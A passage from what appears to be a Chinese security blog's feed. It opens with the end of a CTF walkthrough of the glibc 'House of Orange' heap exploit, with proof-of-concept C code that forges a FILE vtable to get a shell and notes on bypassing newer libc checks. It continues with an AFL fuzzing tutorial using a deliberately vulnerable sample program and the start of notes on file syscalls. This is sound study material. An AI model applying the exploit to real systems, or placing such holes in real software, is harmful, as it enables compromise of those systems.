organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-13"><a href="#运行结果及调试-13" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先分配一个chunk p1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540939340/0" alt="image-20210518215155746"></p><p>然后我们把top chunk的size伪造成0xc01</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540948515/0" alt="image-20210518215457813"></p><p>下面申请一个较大的chunk p2</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540950218/0" alt="image-20210518215527666"></p><p>这时候可以看到我们的旧top chunk被放入了unsorted bin中</p><p>紧接着计算IO_LIST_ALL的地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540957544/0" alt="image-20210518215758179"></p><p>将旧的top chunk的bk指针指向_IO_list_all-0x10</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540962338/0" alt="image-20210518215930176"></p><p>并且将其的前8个字节设为’/bin/sh\x00’</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540965259/0" alt="image-20210518220026228"></p><p>然后将size改为0x61</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540992827/0" alt="image-20210518220718133"></p><p>之后程序对我们的旧top chunk做了对绕过检测的改写，先将mode改为0</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13541013934/0" alt="image-20210518221251680"></p><p>然后修改_IO_write_base</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13541015739/0" alt="image-20210518221322671"></p><p>然后修改_IO_write_ptr</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13541018525/0" alt="image-20210518221413726"></p><p>然后修改我们的vtable，并且控制我们的jump_table</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13541032639/0" alt="image-20210518221815294"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13541071688/0" alt="image-20210518223001421"></p><p>先将我们的jump_table伪造成0x40078f,然后赋值给我们的jump_table</p><p>现在再调用malloc因为会检测size,由于 size&lt;= 2*SIZE_SZ,所以会触发 _IO_flush_all_lockp 中的 _IO_OVERFLOW 函数，虽然继续报错,但我们还是 get shell了</p><h2 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h2><p>house of orange的运用一共有两个阶段</p><p>第一阶段是在不使用free的情况下获取我们的free chunk</p><p>第二个阶段是伪造我们的vtable</p><p>首先，程序写了一个winner函数，该函数作用就是调用system函数</p><p>然后程序申请了chunk p1(0x400-16)</p><p>此时系统的top chunk大小为0x20c01</p><p>因为top chunk需要页对齐并且其pre_inuse标志位始终为1，因此我们将size改成0xc01</p><p>现在申请一个0x1000的chunk，系统就会开一个新页来存储我们的新chunk，而我们的旧top chunk会被放入到unsorted bin中</p><p>有了unsorted bin，下面开始伪造file结构指针了</p><p>在第二阶段前，我们先将旧top chunk的size改为0x61</p><p>第二阶段中,程序先是把旧的top chunk-&gt;bk-&gt;fd指针指向了_io_list_ptr</p><p>为了绕过检测,我们首先要绕过两个检查</p><p>一个是mode必须为0,另一个是_write_base &lt; _write_ptr</p><p>所以程序将我们伪造的write_base改为2,write_ptr改为3</p><p>然后把我们的jump table指向winner函数，将top的前8个字节改成’/bin/sh’</p><p>最后让我们的vtable指向jump_table</p><p>现在再次调用malloc函数,由于size无法通过检测,因此,程序会终止调用,从而触发我们构造好的链</p><p>于是,程序输出错误信息的同时,我们也拿到了shell</p><p>几个疑惑的点：</p><p>关于0x61，在我们malloc之后，会在main_arena属于0x61大小的地方写上一个地址，就比如下图的0x602400</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13542337892/0" alt="image-20210519112041292"></p><p>为什么要在那个地方写个地址呢，因为我们在旧的top chunk的bk写上了_IO_list_all，这样malloc之后就会把IO_list_all的地址改成main_arena+88</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13542523398/0" alt="image-20210519120656219"></p><p>改完之后，这样对应的chain字段就会刚好是我们写了0x602400的地方，chain字段表示下一个IO结构</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13542526522/0" alt="image-20210519120748496"></p><p>在这个结构中，我们已经伪造好了我们需要的数据，vtable等等</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13542530059/0" alt="image-20210519120854705"></p><p>因为最后会触发IO_OVERFLOW函数，所以我们要在对应位置覆盖上我们的winner函数，IO_OVERFLOW应该是第4个(对应偏移下面会给出)，所以我们覆盖成如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13542537415/0" alt="image-20210519121126962"></p><p>偏移：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure><p>vtable：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// &quot;extra word&quot;</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在libc版本&gt;2.23后虽然加了检测机制,但我们依旧可以通过改 vtable为 _IO_str_jump来绕过检测,将偏移0xe0处设置为one_gadget即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前置&quot;&gt;&lt;a href=&quot;#前置&quot; class=&quot;headerlink&quot; title=&quot;前置&quot;&gt;&lt;/a&gt;前置&lt;/h1&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Fuzzing】AFL初探</title>
    <link href="https://billyotry.github.io/2021/05/05/%E3%80%90Fuzzing%E3%80%91AFL%E5%88%9D%E6%8E%A2/"/>
    <id>https://billyotry.github.io/2021/05/05/%E3%80%90Fuzzing%E3%80%91AFL%E5%88%9D%E6%8E%A2/</id>
    <published>2021-05-05T08:24:25.119Z</published>
    <updated>2021-05-05T08:52:35.183Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接去<a href="http://lcamtuf.coredump.cx/afl/">官网</a>下载压缩包，解压后在目录中打开终端输入：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>输入完能看到如下图所示表示安装成功</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13491158133/0" alt="image-20210505162728711"></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>这里我们以一个例子来简单入门下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体概述就是：使用<code>afl-gcc</code>编译源代码，然后以文件作为输入，然后启动<code>afl-fuzz</code>，将输入的测试文件作为程序的输入执行程序，<code>afl</code>会在这个测试文件的基础上进行自动编译输入，从而使程序产生<code>crash</code>，产生的<code>crash</code>就会被记录下来。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>先将上面的源码编译</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-gcc -g -o afl_test afl_test.c</span><br></pre></td></tr></table></figure><p>并且我们新建两个文件夹：<code>fuzz_in</code>和<code>fuzz_out</code>，用来存放程序的输入和fuzz的输出结果</p><p><code>fuzz_in</code>中放入一个<code>testcase</code>文件，内容为<code>aaa</code>即可。</p><h3 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h3><p>输入以下命令就可以开始fuzz了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i fuzz_in -o fuzz_out ./afl_test</span><br></pre></td></tr></table></figure><p>表示从<code>fuzz_in</code>中读取输入，输出放入fuzz_out中，<code>afl_test</code>是我们要进行fuzz的程序，<code>-f</code>参数表示：<code>testcase</code>的内容会作为afl_test的<code>stdin</code></p><p>此时我们可以会有报错，解决方面可以输入下面的命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p>之后就会看到如下界面</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13491181539/0" alt="image-20210505163521126"></p><h3 id="界面介绍"><a href="#界面介绍" class="headerlink" title="界面介绍"></a>界面介绍</h3><h4 id="process-timing"><a href="#process-timing" class="headerlink" title="process timing"></a>process timing</h4><p>这里展示了当前fuzzer的运行时间、最近一次发现新执行路径的时间、最近一次崩溃的时间、最近一次超时的时间。</p><p>值得注意的是第2项，最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。对于此状况，AFL也会智能地进行提醒</p><h4 id="overall-results"><a href="#overall-results" class="headerlink" title="overall results"></a>overall results</h4><p>这里包括运行的总周期数、总路径数、崩溃次数、超时次数。</p><p>其中，总周期数可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过Ctrl-C，中止当前的fuzzing</p><h4 id="stage-progress"><a href="#stage-progress" class="headerlink" title="stage progress"></a>stage progress</h4><p>这里包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度</p><p>执行速度可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing</p><p>以上是简单的介绍，如果要看完整的可以查看<a href="http://lcamtuf.coredump.cx/afl/status_screen.txt">官方的文档</a></p><h3 id="分析crash"><a href="#分析crash" class="headerlink" title="分析crash"></a>分析crash</h3><p>这里我们可以去之前建立的<code>fuzz_out</code>目录中看看生成了什么</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13491188836/0" alt="image-20210505163741317"></p><p>crashes文件夹里面是我们产生crash的样例，hangs里面是产生超时的样例，queue里面是每个不同执行路径的测试用例</p><p>这个样例很明显就是栈溢出的crash情况</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13491202616/0" alt="image-20210505164201471"></p><p>下面这个也是</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13491204703/0" alt="image-20210505164244703"></p><p>下面是首字符为A且字符串长度为66的异常退出情况</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13491227000/0" alt="image-20210505165004075"></p><p>下面是首字符为F且字符串长度为6的异常退出情况</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13491231233/0" alt="image-20210505165130693"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://xz.aliyun.com/t/4314">https://xz.aliyun.com/t/4314</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;直接去&lt;a href=&quot;http://lcamtuf.coredump.cx/afl/&quot;&gt;官网&lt;/a&gt;下载压缩包，解压后在目
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="Fuzz" scheme="https://billyotry.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>【网络编程】基础入门-未完</title>
    <link href="https://billyotry.github.io/2021/04/29/%E3%80%90%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E3%80%91%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%9C%AA%E5%AE%8C/"/>
    <id>https://billyotry.github.io/2021/04/29/%E3%80%90%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E3%80%91%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%9C%AA%E5%AE%8C/</id>
    <published>2021-04-29T07:43:31.792Z</published>
    <updated>2021-05-10T03:05:00.300Z</updated>
    
    <content type="html"><![CDATA[<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="0x01文件相关"><a href="#0x01文件相关" class="headerlink" title="0x01文件相关"></a>0x01文件相关</h2><h3 id="文件描述符相关-重点"><a href="#文件描述符相关-重点" class="headerlink" title="文件描述符相关(重点)"></a>文件描述符相关(重点)</h3><h3 id="open函数"><a href="#open函数" class="headerlink" title="open函数"></a>open函数</h3><p>头文件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;      //define pid_t和size_t</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>声明：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ol><li><p><strong>pathname</strong>：这个参数是指向想要打开的文件路径名，或者文件名。我们需要注意的是，<strong>这个路径名是绝对路径名，如果是文件名则是在当前路径下的</strong></p></li><li><p><strong>flags</strong>：这个参数表示打开文件所采用的操作，我们需要注意的是：<strong>必须指定以下三个常量中的一种，且只允许指定一个</strong></p><p><strong>O_RDONLY：只读模式</strong></p><p><strong>O_WRONLY：只写模式</strong></p><p><strong>O_RDWR：可读可写</strong></p><p>以下常量是选用的，这些选项是用来和上面的必选项进行按位或起来作为参数的</p><p>​    O_APPEND 表示追加，如果原来文件里面有内容，则这次写入会写在文件的最末尾。<br>​    O_CREAT 表示如果指定文件不存在，则创建这个文件<br>​    O_EXCL 表示如果要创建的文件已存在，则出错，同时返回 -1，并且修改 errno 的值。<br>​    O_TRUNC 表示截断，如果文件存在，并且以只写、读写方式打开，则将其长度截断为0。<br>​    O_NOCTTY 如果路径名指向终端设备，不要把这个设备用作控制终端。<br>​    O_NONBLOCK 如果路径名指向 FIFO/块文件/字符文件，则把文件的打开和后继 I/O设置为非阻塞模式（nonblocking mode）<br>以下三个常量同样是选用的，它们用于同步输入输出</p><p>​    O_DSYNC 等待物理 I/O 结束后再 write。在不影响读取新写入的数据的前提下，不等待文件属性更新。<br>​    O_RSYNC read 等待所有写入同一区域的写操作完成后再进行<br>​    O_SYNC 等待物理 I/O 结束后再 write，包括更新文件属性的 I/O</p></li><li><p><strong>mode</strong>：这个参数表示设置文件访问权限的初始值，和用户掩码umask有关，比如0644表示-rw-r-r-，也可以用S_IRUSR、S_IWUSR等宏定义按位或起来表示。要注意的是，有以下几点</p><p><strong>文件权限由open的mode参数和当前进程的umask掩码共同决定。</strong><br><strong>第三个参数是在第二个参数中有O_CREAT时才作用，如果没有，则第三个参数可以忽略</strong></p><p>S_IRWXU 00700 权限, 代表该文件所有者具有可读、可写及可执行的权限.<br>S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限.<br>S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限.<br>S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限.<br>S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限.<br>S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限.<br>S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限.<br>S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限.<br>S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限.<br>S_IROTH 00004 权限, 代表其他用户具有可读的权限<br>S_IWOTH 00002 权限, 代表其他用户具有可写入的权限.<br>S_IXOTH 00001 权限, 代表其他用户具有可执行的权限.</p></li></ol><p>   返回值：操作成功返回一个文件描述符，失败返回-1</p><p>   Error Code：</p>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EEXIST 参数pathname 所指的文件已存在, 却使用了O_CREAT 和O_EXCL Flag.</span><br><span class="line">EACCESS 参数pathname 所指的文件不符合所要求测试的权限.</span><br><span class="line">EROFS 欲测试写入权限的文件存在于只读文件系统内.</span><br><span class="line">EFAULT 参数pathname 指针超出可存取内存空间.</span><br><span class="line">EINVAL 参数mode 不正确.</span><br><span class="line">ENAMETOOLONG 参数 pathname 太长.</span><br><span class="line">ENOTDIR 参数pathname 不是目录.</span><br><span class="line">ENOMEM 核心内存不足.</span><br><span class="line">ELOOP 参数pathname 有过多符号连接问题.</span><br><span class="line">EIO I&#x2F;O 存取错误.</span><br></pre></td></tr></table></figure><h3 id="close函数"><a href="#close函数" class="headerlink" title="close函数"></a>close函数</h3><p>当使用完文件后若已不在需要则可使用<code>close()</code>来关闭该文件，<code>close()</code>会让数据写汇磁盘，并释放该文件所占用的资源，参数<code>fd</code>为先前由<code>open()</code>或<code>creat()</code>所返回的文件描述符</p><p>头文件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>声明：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：若文件顺利关闭返回0，否则-1</p><p>Error Code:</p><figure class="highlight plain"><table><tr><td 